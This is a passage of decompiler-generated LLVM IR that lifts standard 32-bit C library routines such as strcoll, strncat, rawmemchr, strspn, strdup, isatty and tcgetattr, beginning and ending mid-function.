dec_label_pc_804d1d3.dec_label_pc_804d1d5_crit_edge.dec_label_pc_804d19f_crit_edge: ; preds = %dec_label_pc_804d1d3.dec_label_pc_804d1d5_crit_edge
  %v0_804d19f.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_804d19f

dec_label_pc_804d1d8:                             ; preds = %dec_label_pc_804d1d5.preheader, %dec_label_pc_804d1a7, %dec_label_pc_804d1d3.dec_label_pc_804d1d5_crit_edge, %dec_label_pc_804d1d3, %dec_label_pc_804d1c6
  %v0_804d1d8 = load i32, i32* @ebx, align 4
  %v1_804d1d8 = load i32, i32* @edi, align 4
  %tmp = icmp ugt i32 %v0_804d1d8, %v1_804d1d8
  br i1 %tmp, label %dec_label_pc_804d1dc, label %dec_label_pc_804d1e1

dec_label_pc_804d1dc:                             ; preds = %dec_label_pc_804d1d8
  %v1_804d1dc = inttoptr i32 %v0_804d1d8 to i8*
  store i8 0, i8* %v1_804d1dc, align 1
  %v0_804d1e6.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_804d1e3

dec_label_pc_804d1e1:                             ; preds = %dec_label_pc_804d1d8, %dec_label_pc_804d1c6, %entry
  br label %dec_label_pc_804d1e3

dec_label_pc_804d1e3:                             ; preds = %dec_label_pc_804d1dc, %dec_label_pc_804d1e1
  %v0_804d1e6 = phi i32 [ %v0_804d1e6.pre, %dec_label_pc_804d1dc ], [ 0, %dec_label_pc_804d1e1 ]
  store i32 %v0_804d1e6, i32* %eax.global-to-local, align 4
  store i32 %v0_804d184, i32* @ebp, align 4
  ret i32 %v0_804d1e6

; uselistorder directives
  uselistorder i32 %v0_804d1e6, { 1, 0 }
  uselistorder i32 %v0_804d1d8, { 1, 0 }
  uselistorder i32 %v1_804d1d5, { 1, 0 }
  uselistorder i32 %v0_804d1b9, { 0, 2, 1 }
  uselistorder i32 %v0_804d19f, { 1, 0 }
  uselistorder label %dec_label_pc_804d1e3, { 1, 0 }
  uselistorder label %dec_label_pc_804d1d8, { 2, 3, 4, 1, 0 }
  uselistorder label %dec_label_pc_804d1d3.dec_label_pc_804d1d5_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_804d19f, { 1, 0 }
}

define i32 @__GI_strcoll(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v4_804d1f2 = ptrtoint i8* %arg1 to i32
  %v4_804d1fa.pre = load i32, i32* @eax, align 4
  %v8_804d1fa.pre = load i1, i1* @df, align 1
  %v9_804d1fa = select i1 %v8_804d1fa.pre, i32 -1, i32 1
  br label %dec_label_pc_804d1fa

dec_label_pc_804d1fa:                             ; preds = %dec_label_pc_804d1fe, %entry
  %v20_804d1fb = phi i32 [ %v23_804d1fb, %dec_label_pc_804d1fe ], [ %arg2, %entry ]
  %v4_804d1fa = phi i32 [ %v6_804d1fa, %dec_label_pc_804d1fe ], [ %v4_804d1fa.pre, %entry ]
  %v7_804d1fa = phi i32 [ %v10_804d1fa, %dec_label_pc_804d1fe ], [ %v4_804d1f2, %entry ]
  %v1_804d1fa = inttoptr i32 %v7_804d1fa to i8*
  %v2_804d1fa = load i8, i8* %v1_804d1fa, align 1
  %v3_804d1fb = inttoptr i32 %v20_804d1fb to i8*
  %v4_804d1fb = load i8, i8* %v3_804d1fb, align 1
  %v15_804d1fb = icmp eq i8 %v2_804d1fa, %v4_804d1fb
  %v1_804d1fc = icmp eq i1 %v15_804d1fb, false
  br i1 %v1_804d1fc, label %dec_label_pc_804d206, label %dec_label_pc_804d1fe

dec_label_pc_804d1fe:                             ; preds = %dec_label_pc_804d1fa
  %v3_804d1fa = zext i8 %v2_804d1fa to i32
  %v5_804d1fa = and i32 %v4_804d1fa, -256
  %v6_804d1fa = or i32 %v3_804d1fa, %v5_804d1fa
  %v23_804d1fb = add i32 %v20_804d1fb, %v9_804d1fa
  %v10_804d1fa = add i32 %v7_804d1fa, %v9_804d1fa
  %v4_804d1fe = icmp eq i8 %v2_804d1fa, 0
  %v1_804d200 = icmp eq i1 %v4_804d1fe, false
  br i1 %v1_804d200, label %dec_label_pc_804d1fa, label %dec_label_pc_804d20a

dec_label_pc_804d206:                             ; preds = %dec_label_pc_804d1fa
  br label %dec_label_pc_804d20a

dec_label_pc_804d20a:                             ; preds = %dec_label_pc_804d1fe, %dec_label_pc_804d206
  %storemerge = phi i32 [ 1, %dec_label_pc_804d206 ], [ 0, %dec_label_pc_804d1fe ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i8 %v2_804d1fa, { 1, 2, 0 }
  uselistorder i32 %v9_804d1fa, { 1, 0 }
  uselistorder label %dec_label_pc_804d20a, { 1, 0 }
}

declare i32 @strlen(i8*) local_unnamed_addr

define i32 @__GI_strncat() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i8* @__decompiler_undefined_function_4()
  %stack_var_-8 = alloca i32, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_804d227 = load i32, i32* @esi, align 4
  store i32 %v0_804d227, i32* %stack_var_-8, align 4
  store i32 -1, i32* %ecx.global-to-local, align 4
  %v4_804d22b = ptrtoint i8* %tmp5 to i32
  store i32 %v4_804d22b, i32* %esi.global-to-local, align 4
  %v4_804d233 = inttoptr i32 %tmp to i8*
  store i32 %tmp, i32* %edi.global-to-local, align 4
  %v3_804d237 = call i32 @_strlen(i8* %v4_804d233)
  %v2_804d239 = add i32 %tmp, -1
  store i32 %v2_804d239, i32* %edi.global-to-local, align 4
  %v8_804d23d10 = icmp eq i32 %tmp4, 0
  store i32 %tmp4, i32* %ecx.global-to-local, align 4
  br i1 %v8_804d23d10, label %dec_label_pc_804d248, label %dec_label_pc_804d240.lr.ph

dec_label_pc_804d240.lr.ph:                       ; preds = %entry
  %v4_804d240.pre = load i32, i32* %eax.global-to-local, align 4
  %v8_804d240.pre = load i1, i1* @df, align 1
  br label %dec_label_pc_804d240

dec_label_pc_804d240:                             ; preds = %dec_label_pc_804d240.lr.ph, %dec_label_pc_804d240.dec_label_pc_804d23d_crit_edge
  %v8_804d240 = phi i1 [ %v8_804d240.pre, %dec_label_pc_804d240.lr.ph ], [ %v5_804d241, %dec_label_pc_804d240.dec_label_pc_804d23d_crit_edge ]
  %v4_804d240 = phi i32 [ %v4_804d240.pre, %dec_label_pc_804d240.lr.ph ], [ %v0_804d242, %dec_label_pc_804d240.dec_label_pc_804d23d_crit_edge ]
  %v2_804d24a12 = phi i32 [ %v2_804d239, %dec_label_pc_804d240.lr.ph ], [ %v7_804d241, %dec_label_pc_804d240.dec_label_pc_804d23d_crit_edge ]
  %v0_804d240 = load i32, i32* %esi.global-to-local, align 4
  %v1_804d240 = inttoptr i32 %v0_804d240 to i8*
  %v2_804d240 = load i8, i8* %v1_804d240, align 1
  %v3_804d240 = zext i8 %v2_804d240 to i32
  %v5_804d240 = and i32 %v4_804d240, -256
  %v6_804d240 = or i32 %v5_804d240, %v3_804d240
  store i32 %v6_804d240, i32* %eax.global-to-local, align 4
  %v9_804d240 = select i1 %v8_804d240, i32 -1, i32 1
  %v10_804d240 = add i32 %v9_804d240, %v0_804d240
  store i32 %v10_804d240, i32* %esi.global-to-local, align 4
  %v3_804d241 = inttoptr i32 %v2_804d24a12 to i8*
  store i8 %v2_804d240, i8* %v3_804d241, align 1
  %v4_804d241 = load i32, i32* %edi.global-to-local, align 4
  %v5_804d241 = load i1, i1* @df, align 1
  %v6_804d241 = select i1 %v5_804d241, i32 -1, i32 1
  %v7_804d241 = add i32 %v6_804d241, %v4_804d241
  store i32 %v7_804d241, i32* %edi.global-to-local, align 4
  %v0_804d242 = load i32, i32* %eax.global-to-local, align 4
  %v3_804d242 = trunc i32 %v0_804d242 to i8
  %v4_804d242 = icmp eq i8 %v3_804d242, 0
  %v1_804d244 = icmp eq i1 %v4_804d242, false
  br i1 %v1_804d244, label %dec_label_pc_804d240.dec_label_pc_804d23d_crit_edge, label %dec_label_pc_804d24b

dec_label_pc_804d240.dec_label_pc_804d23d_crit_edge: ; preds = %dec_label_pc_804d240
  %v0_804d23d.pre = load i32, i32* %ecx.global-to-local, align 4
  %v1_804d23d = add i32 %v0_804d23d.pre, -1
  %v8_804d23d = icmp eq i32 %v1_804d23d, 0
  store i32 %v1_804d23d, i32* %ecx.global-to-local, align 4
  br i1 %v8_804d23d, label %dec_label_pc_804d248, label %dec_label_pc_804d240

dec_label_pc_804d248:                             ; preds = %dec_label_pc_804d240.dec_label_pc_804d23d_crit_edge, %entry
  %v2_804d24a.lcssa = phi i32 [ %v2_804d239, %entry ], [ %v7_804d241, %dec_label_pc_804d240.dec_label_pc_804d23d_crit_edge ]
  store i32 0, i32* %eax.global-to-local, align 4
  %v3_804d24a = inttoptr i32 %v2_804d24a.lcssa to i8*
  store i8 0, i8* %v3_804d24a, align 1
  %v4_804d24a = load i32, i32* %edi.global-to-local, align 4
  %v5_804d24a = load i1, i1* @df, align 1
  %v6_804d24a = select i1 %v5_804d24a, i32 -1, i32 1
  %v7_804d24a = add i32 %v6_804d24a, %v4_804d24a
  store i32 %v7_804d24a, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804d24b

dec_label_pc_804d24b:                             ; preds = %dec_label_pc_804d240, %dec_label_pc_804d248
  store i32 %tmp, i32* %eax.global-to-local, align 4
  %v2_804d24f = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804d24f, i32* @esi, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v1_804d23d, { 1, 0 }
  uselistorder i32 %v0_804d242, { 1, 0 }
  uselistorder i32 %v7_804d241, { 0, 2, 1 }
  uselistorder i1 %v5_804d241, { 1, 0 }
  uselistorder i32 %tmp4, { 1, 0 }
  uselistorder i32 %tmp, { 4, 3, 0, 1, 2 }
  uselistorder i32* %edi.global-to-local, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32* %ecx.global-to-local, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_804d24b, { 1, 0 }
  uselistorder label %dec_label_pc_804d240, { 1, 0 }
}

define i32 @rawmemchr(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_804d255 = load i32, i32* @ebx, align 4
  %v4_804d256 = urem i32 %arg2, 256
  %v4_804d25a = ptrtoint i8* %arg1 to i32
  %v2_804d2653 = urem i32 %v4_804d25a, 4
  %v3_804d2654 = icmp eq i32 %v2_804d2653, 0
  %v1_804d2678 = icmp eq i1 %v3_804d2654, false
  %v4_804d260 = trunc i32 %arg2 to i8
  br i1 %v1_804d2678, label %dec_label_pc_804d260, label %dec_label_pc_804d269

dec_label_pc_804d260:                             ; preds = %entry, %dec_label_pc_804d264
  %v0_804d264 = phi i32 [ %v1_804d264, %dec_label_pc_804d264 ], [ %v4_804d25a, %entry ]
  %v1_804d260 = inttoptr i32 %v0_804d264 to i8*
  %v2_804d260 = load i8, i8* %v1_804d260, align 1
  %v15_804d260 = icmp eq i8 %v2_804d260, %v4_804d260
  br i1 %v15_804d260, label %dec_label_pc_804d2b4, label %dec_label_pc_804d264

dec_label_pc_804d264:                             ; preds = %dec_label_pc_804d260
  %v1_804d264 = add i32 %v0_804d264, 1
  %v2_804d265 = urem i32 %v1_804d264, 4
  %v3_804d265 = icmp eq i32 %v2_804d265, 0
  %v1_804d267 = icmp eq i1 %v3_804d265, false
  br i1 %v1_804d267, label %dec_label_pc_804d260, label %dec_label_pc_804d269

dec_label_pc_804d269:                             ; preds = %entry, %dec_label_pc_804d264
  %v0_804d26c = phi i32 [ %v1_804d264, %dec_label_pc_804d264 ], [ %v4_804d25a, %entry ]
  %v2_804d270 = mul nuw nsw i32 %v4_804d256, 256
  %v2_804d273 = or i32 %v2_804d270, %v4_804d256
  %v2_804d277 = mul i32 %v2_804d273, 65536
  %v2_804d27a = or i32 %v2_804d277, %v2_804d273
  br label %dec_label_pc_804d27c

dec_label_pc_804d27c:                             ; preds = %dec_label_pc_804d2ac, %dec_label_pc_804d27c, %dec_label_pc_804d269
  %v0_804d280 = phi i32 [ %v0_804d26c, %dec_label_pc_804d269 ], [ %v1_804d280, %dec_label_pc_804d27c ], [ %v1_804d280, %dec_label_pc_804d2ac ]
  %v2_804d27e = inttoptr i32 %v0_804d280 to i32*
  %v3_804d27e = load i32, i32* %v2_804d27e, align 4
  %v4_804d27e = xor i32 %v3_804d27e, %v2_804d27a
  %v1_804d280 = add i32 %v0_804d280, 4
  store i32 %v1_804d280, i32* @ecx, align 4
  %v1_804d283 = add i32 %v4_804d27e, 2130640639
  %v1_804d289 = sub i32 -1, %v4_804d27e
  store i32 %v1_804d289, i32* @edx, align 4
  %v2_804d28b = xor i32 %v1_804d283, %v1_804d289
  %v1_804d28d = and i32 %v2_804d28b, -2130640640
  %v2_804d28d = icmp eq i32 %v1_804d28d, 0
  br i1 %v2_804d28d, label %dec_label_pc_804d27c, label %dec_label_pc_804d294

dec_label_pc_804d294:                             ; preds = %dec_label_pc_804d27c
  %v2_804d294 = inttoptr i32 %v0_804d280 to i8*
  %v3_804d294 = load i8, i8* %v2_804d294, align 1
  %v16_804d294 = icmp eq i8 %v3_804d294, %v4_804d260
  br i1 %v16_804d294, label %dec_label_pc_804d2b4, label %dec_label_pc_804d29c

dec_label_pc_804d29c:                             ; preds = %dec_label_pc_804d294
  %v1_804d29c = add i32 %v0_804d280, 1
  %v2_804d29c = inttoptr i32 %v1_804d29c to i8*
  %v3_804d29c = load i8, i8* %v2_804d29c, align 1
  %v16_804d29c = icmp eq i8 %v3_804d29c, %v4_804d260
  br i1 %v16_804d29c, label %dec_label_pc_804d2b4, label %dec_label_pc_804d2a4

dec_label_pc_804d2a4:                             ; preds = %dec_label_pc_804d29c
  %v1_804d2a4 = add i32 %v0_804d280, 2
  %v2_804d2a4 = inttoptr i32 %v1_804d2a4 to i8*
  %v3_804d2a4 = load i8, i8* %v2_804d2a4, align 1
  %v16_804d2a4 = icmp eq i8 %v3_804d2a4, %v4_804d260
  br i1 %v16_804d2a4, label %dec_label_pc_804d2b4, label %dec_label_pc_804d2ac

dec_label_pc_804d2ac:                             ; preds = %dec_label_pc_804d2a4
  %v1_804d2ac = add i32 %v0_804d280, 3
  %v2_804d2ac = inttoptr i32 %v1_804d2ac to i8*
  %v3_804d2ac = load i8, i8* %v2_804d2ac, align 1
  %v16_804d2ac = icmp eq i8 %v3_804d2ac, %v4_804d260
  %v1_804d2b2 = icmp eq i1 %v16_804d2ac, false
  br i1 %v1_804d2b2, label %dec_label_pc_804d27c, label %dec_label_pc_804d2b4

dec_label_pc_804d2b4:                             ; preds = %dec_label_pc_804d260, %dec_label_pc_804d2ac, %dec_label_pc_804d2a4, %dec_label_pc_804d29c, %dec_label_pc_804d294
  %v0_804d2b6 = phi i32 [ %v1_804d2ac, %dec_label_pc_804d2ac ], [ %v1_804d2a4, %dec_label_pc_804d2a4 ], [ %v1_804d29c, %dec_label_pc_804d29c ], [ %v0_804d280, %dec_label_pc_804d294 ], [ %v0_804d264, %dec_label_pc_804d260 ]
  store i32 %v0_804d255, i32* @ebx, align 4
  ret i32 %v0_804d2b6

; uselistorder directives
  uselistorder i32 %v1_804d289, { 1, 0 }
  uselistorder i32 %v1_804d280, { 2, 1, 0 }
  uselistorder i32 %v2_804d273, { 1, 0 }
  uselistorder i32 %v1_804d264, { 1, 0, 2 }
  uselistorder i8 %v4_804d260, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v4_804d25a, { 2, 1, 0 }
  uselistorder i32 %v4_804d256, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_804d2b4, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_804d269, { 1, 0 }
  uselistorder label %dec_label_pc_804d260, { 1, 0 }
}

define i32 @__GI_strspn(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v2_804d2da31 = load i8, i8* %arg1, align 1
  %v4_804d2dc35 = icmp eq i8 %v2_804d2da31, 0
  br i1 %v4_804d2dc35, label %dec_label_pc_804d2e4, label %dec_label_pc_804d2e0.lr.ph

dec_label_pc_804d2e0.lr.ph:                       ; preds = %entry
  %v3_804d2da32 = zext i8 %v2_804d2da31 to i32
  %v4_804d2da.pre = load i32, i32* @eax, align 4
  %v5_804d2da33 = and i32 %v4_804d2da.pre, -256
  %v6_804d2da34 = or i32 %v3_804d2da32, %v5_804d2da33
  %v4_804d2c1 = ptrtoint i8* %arg1 to i32
  %v1_804d2cc18 = inttoptr i32 %arg2 to i8*
  %v4_804d2cc.pre.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_804d2e0

dec_label_pc_804d2c7:                             ; preds = %dec_label_pc_804d2e0, %dec_label_pc_804d2cb
  %v6_804d2cc28 = phi i32 [ %v6_804d2cc, %dec_label_pc_804d2cb ], [ %v6_804d2cc22, %dec_label_pc_804d2e0 ]
  %v2_804d2cc27 = phi i8 [ %v2_804d2cc, %dec_label_pc_804d2cb ], [ %v2_804d2cc19, %dec_label_pc_804d2e0 ]
  %v0_804d2cb26 = phi i32 [ %v1_804d2cb, %dec_label_pc_804d2cb ], [ %arg2, %dec_label_pc_804d2e0 ]
  %v15_804d2c7 = icmp eq i8 %v2_804d2da39, %v2_804d2cc27
  br i1 %v15_804d2c7, label %dec_label_pc_804d2d4, label %dec_label_pc_804d2cb

dec_label_pc_804d2cb:                             ; preds = %dec_label_pc_804d2c7
  %v1_804d2cb = add i32 %v0_804d2cb26, 1
  store i32 %v1_804d2cb, i32* @edx, align 4
  %v1_804d2cc = inttoptr i32 %v1_804d2cb to i8*
  %v2_804d2cc = load i8, i8* %v1_804d2cc, align 1
  %v3_804d2cc = zext i8 %v2_804d2cc to i32
  %v5_804d2cc = and i32 %v6_804d2cc28, -256
  %v6_804d2cc = or i32 %v3_804d2cc, %v5_804d2cc
  store i32 %v6_804d2cc, i32* @ecx, align 4
  %v4_804d2ce = icmp eq i8 %v2_804d2cc, 0
  %v1_804d2d0 = icmp eq i1 %v4_804d2ce, false
  br i1 %v1_804d2d0, label %dec_label_pc_804d2c7, label %dec_label_pc_804d2e4

dec_label_pc_804d2d4:                             ; preds = %dec_label_pc_804d2c7
  %v1_804d2d8 = add i32 %v0_804d2e537, 1
  %v1_804d2d9 = add i32 %v0_804d2d938, 1
  %v1_804d2da = inttoptr i32 %v1_804d2d9 to i8*
  %v2_804d2da = load i8, i8* %v1_804d2da, align 1
  %v3_804d2da = zext i8 %v2_804d2da to i32
  %v5_804d2da = and i32 %v6_804d2da40, -256
  %v6_804d2da = or i32 %v3_804d2da, %v5_804d2da
  %v4_804d2dc = icmp eq i8 %v2_804d2da, 0
  br i1 %v4_804d2dc, label %dec_label_pc_804d2e4, label %dec_label_pc_804d2e0

dec_label_pc_804d2e0:                             ; preds = %dec_label_pc_804d2e0.lr.ph, %dec_label_pc_804d2d4
  %v4_804d2cc.pre = phi i32 [ %v4_804d2cc.pre.pre, %dec_label_pc_804d2e0.lr.ph ], [ %v6_804d2cc28, %dec_label_pc_804d2d4 ]
  %v6_804d2da40 = phi i32 [ %v6_804d2da34, %dec_label_pc_804d2e0.lr.ph ], [ %v6_804d2da, %dec_label_pc_804d2d4 ]
  %v2_804d2da39 = phi i8 [ %v2_804d2da31, %dec_label_pc_804d2e0.lr.ph ], [ %v2_804d2da, %dec_label_pc_804d2d4 ]
  %v0_804d2d938 = phi i32 [ %v4_804d2c1, %dec_label_pc_804d2e0.lr.ph ], [ %v1_804d2d9, %dec_label_pc_804d2d4 ]
  %v0_804d2e537 = phi i32 [ 0, %dec_label_pc_804d2e0.lr.ph ], [ %v1_804d2d8, %dec_label_pc_804d2d4 ]
  store i32 %arg2, i32* @edx, align 4
  %v2_804d2cc19 = load i8, i8* %v1_804d2cc18, align 1
  %v3_804d2cc20 = zext i8 %v2_804d2cc19 to i32
  %v5_804d2cc21 = and i32 %v4_804d2cc.pre, -256
  %v6_804d2cc22 = or i32 %v3_804d2cc20, %v5_804d2cc21
  store i32 %v6_804d2cc22, i32* @ecx, align 4
  %v4_804d2ce23 = icmp eq i8 %v2_804d2cc19, 0
  %v1_804d2d025 = icmp eq i1 %v4_804d2ce23, false
  br i1 %v1_804d2d025, label %dec_label_pc_804d2c7, label %dec_label_pc_804d2e4

dec_label_pc_804d2e4:                             ; preds = %entry, %dec_label_pc_804d2d4, %dec_label_pc_804d2e0, %dec_label_pc_804d2cb
  %v0_804d2e517 = phi i32 [ %v0_804d2e537, %dec_label_pc_804d2cb ], [ %v0_804d2e537, %dec_label_pc_804d2e0 ], [ 0, %entry ], [ %v1_804d2d8, %dec_label_pc_804d2d4 ]
  ret i32 %v0_804d2e517

; uselistorder directives
  uselistorder i32 %v6_804d2cc22, { 1, 0 }
  uselistorder i8 %v2_804d2cc19, { 1, 2, 0 }
  uselistorder i32 %v1_804d2d9, { 1, 0 }
  uselistorder i32 %v6_804d2cc, { 1, 0 }
  uselistorder i8 %v2_804d2cc, { 1, 2, 0 }
  uselistorder i32 %v1_804d2cb, { 2, 1, 0 }
  uselistorder i8 %v2_804d2da31, { 0, 2, 1 }
  uselistorder i32 %arg2, { 2, 0, 1 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804d2e4, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_804d2e0, { 1, 0 }
}

define i32 @__GI_strdup(i8* %arg1) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_804d2ec = load i32, i32* @edi, align 4
  %v0_804d2ed = load i32, i32* @esi, align 4
  %v0_804d2ee = load i32, i32* @ebx, align 4
  store i32 %v0_804d2ee, i32* %stack_var_-12, align 4
  %v4_804d2ef = ptrtoint i8* %arg1 to i32
  store i32 %v4_804d2ef, i32* @edi, align 4
  %v3_804d2f7 = call i32 @strlen(i8* %arg1)
  %v1_804d2fc = add i32 %v3_804d2f7, 1
  store i32 %v1_804d2fc, i32* @esi, align 4
  %v2_804d302 = call i32 @malloc(i32 %v1_804d2fc)
  %v1_804d30a = icmp eq i32 %v2_804d302, 0
  store i32 %v2_804d302, i32* %ebx.global-to-local, align 4
  br i1 %v1_804d30a, label %dec_label_pc_804d31c, label %dec_label_pc_804d310

dec_label_pc_804d310:                             ; preds = %entry
  %v0_804d311 = load i32, i32* @esi, align 4
  %v0_804d312 = load i32, i32* @edi, align 4
  %tmp12 = inttoptr i32 %v2_804d302 to i16*
  %v6_804d314 = call i32 @memcpy(i16* %tmp12, i32 %v0_804d312, i32 %v0_804d311)
  %v0_804d31c.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804d31c

dec_label_pc_804d31c:                             ; preds = %entry, %dec_label_pc_804d310
  %v0_804d31c = phi i32 [ 0, %entry ], [ %v0_804d31c.pre, %dec_label_pc_804d310 ]
  %v2_804d31e = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804d31e, i32* @ebx, align 4
  store i32 %v0_804d2ed, i32* @esi, align 4
  store i32 %v0_804d2ec, i32* @edi, align 4
  ret i32 %v0_804d31c

; uselistorder directives
  uselistorder i32 %v2_804d302, { 0, 2, 1 }
  uselistorder i32 (i32)* @malloc, { 6, 5, 4, 3, 2, 1, 8, 7, 0 }
  uselistorder label %dec_label_pc_804d31c, { 1, 0 }
}

define i32 @isatty(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-60 = alloca i32, align 4
  %v3_804d330 = call i32 @__GI_tcgetattr(i32 %arg1, i32* nonnull %stack_var_-60)
  %v1_804d335 = icmp eq i32 %v3_804d330, 0
  %v1_804d337 = zext i1 %v1_804d335 to i32
  ret i32 %v1_804d337
}

define i32 @__GI_tcgetattr(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %tmp = call i8 @__decompiler_undefined_function_1()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %tmp8 = ptrtoint i32* %arg2 to i32
  %stack_var_-27 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804d344 = load i32, i32* @esi, align 4
  %v0_804d345 = load i32, i32* @ebx, align 4
  store i32 %v0_804d345, i32* %stack_var_-8, align 4
  %v2_804d349 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_804d349, i32* %eax.global-to-local, align 4
  store i32 %tmp8, i32* @ebx, align 4
  %v3_804d35b = call i32 @ioctl(i32 %arg1, i32 21505, i32 %v2_804d349)
  store i32 %v3_804d35b, i32* %eax.global-to-local, align 4
  %v1_804d363 = icmp eq i32 %v3_804d35b, 0
  store i32 %v3_804d35b, i32* @esi, align 4
  %v1_804d367 = icmp eq i1 %v1_804d363, false
  br i1 %v1_804d367, label %dec_label_pc_804d3ac, label %dec_label_pc_804d369

dec_label_pc_804d369:                             ; preds = %entry
  %v3_804d369 = load i32, i32* %stack_var_-44, align 4
  %v1_804d36d = load i32, i32* @ebx, align 4
  %v2_804d36d = inttoptr i32 %v1_804d36d to i32*
  store i32 %v3_804d369, i32* %v2_804d36d, align 4
  %v1_804d373 = load i32, i32* @ebx, align 4
  %v2_804d373 = add i32 %v1_804d373, 4
  %v3_804d373 = inttoptr i32 %v2_804d373 to i32*
  %v1_804d37a = load i32, i32* @ebx, align 4
  %v2_804d37a = add i32 %v1_804d37a, 8
  %v3_804d37a = inttoptr i32 %v2_804d37a to i32*
  store i32 %tmp3, i32* %eax.global-to-local, align 4
  %v1_804d381 = load i32, i32* @ebx, align 4
  %v2_804d381 = add i32 %v1_804d381, 12
  %v3_804d381 = inttoptr i32 %v2_804d381 to i32*
  store i32 %tmp3, i32* %v3_804d381, align 4
  %v4_804d384 = zext i8 %tmp to i32
  %v5_804d384 = load i32, i32* %eax.global-to-local, align 4
  %v6_804d384 = and i32 %v5_804d384, -256
  %v7_804d384 = or i32 %v6_804d384, %v4_804d384
  store i32 %v7_804d384, i32* %eax.global-to-local, align 4
  %v2_804d388 = load i32, i32* @ebx, align 4
  %v3_804d388 = add i32 %v2_804d388, 16
  %v4_804d388 = inttoptr i32 %v3_804d388 to i8*
  store i8 %tmp, i8* %v4_804d388, align 1
  %v0_804d38b = load i32, i32* %eax.global-to-local, align 4
  %v2_804d38e = ptrtoint i32* %stack_var_-27 to i32
  %v0_804d393 = load i32, i32* @ebx, align 4
  %v1_804d393 = add i32 %v0_804d393, 17
  store i32 %v1_804d393, i32* %eax.global-to-local, align 4
  %v4_804d397 = call i32 @__GI_mempcpy(i32 %v1_804d393, i32 %v2_804d38e, i32 19, i32 %v0_804d38b)
  store i32 %v4_804d397, i32* %eax.global-to-local, align 4
  %v3_804d3a4 = inttoptr i32 %v4_804d397 to i8*
  %v4_804d3a4 = call i32 @__GI_memset(i8* %v3_804d3a4, i32 0, i32 13)
  store i32 %v4_804d3a4, i32* %eax.global-to-local, align 4
  %v0_804d3af.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804d3ac

dec_label_pc_804d3ac:                             ; preds = %entry, %dec_label_pc_804d369
  %v0_804d3af = phi i32 [ %v3_804d35b, %entry ], [ %v0_804d3af.pre, %dec_label_pc_804d369 ]
  store i32 %v0_804d3af, i32* %eax.global-to-local, align 4
  %v2_804d3b1 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804d3b1, i32* @ebx, align 4
  store i32 %v0_804d344, i32* @esi, align 4
  ret i32 %v0_804d3af

; uselistorder directives
  uselistorder i32 %v0_804d3af, { 1, 0 }
  uselistorder i32 %tmp3, { 1, 0 }
  uselistorder i8 %tmp, { 1, 0 }
  uselistorder label %dec_label_pc_804d3ac, { 1, 0 }
}

define i32 @inet_pton4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %zf.global-to-local = alloca i1, align 1
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  store i32 0, i32* @edx, align 4
  %v0_804d3ba = load i32, i32* @esi, align 4
  store i32 0, i32* @edi, align 4
  %v0_804d3bd = load i32, i32* @ebx, align 4
  store i32 %v0_804d3bd, i32* %stack_var_-16, align 4
  %v0_804d3be = load i32, i32* @eax, align 4
  store i32 %v0_804d3be, i32* %ebx.global-to-local, align 4
  store i1 false, i1* %zf.global-to-local, align 1
  %v15_804d3c0 = ptrtoint i32* %stack_var_-44 to i32
  %v2_804d3c3 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_804d3c3, i32* @esi, align 4
  store i32 0, i32* %stack_var_-20, align 4
  %v1_804d40b15 = inttoptr i32 %v0_804d3be to i8*
  %v2_804d40b16 = load i8, i8* %v1_804d40b15, align 1
  %v3_804d40b17 = sext i8 %v2_804d40b16 to i32
  store i32 %v3_804d40b17, i32* @ecx, align 4
  %v1_804d40e18 = add i32 %v0_804d3be, 1
  store i32 %v1_804d40e18, i32* %ebx.global-to-local, align 4
  %v1_804d40f19 = icmp eq i8 %v2_804d40b16, 0
  store i1 %v1_804d40f19, i1* %zf.global-to-local, align 1
  %v1_804d41121 = icmp eq i1 %v1_804d40f19, false
  br i1 %v1_804d41121, label %dec_label_pc_804d3ce, label %dec_label_pc_804d413

dec_label_pc_804d3ce:                             ; preds = %entry, %dec_label_pc_804d40b.backedge
  %v3_804d40b23 = phi i32 [ %v3_804d40b, %dec_label_pc_804d40b.backedge ], [ %v3_804d40b17, %entry ]
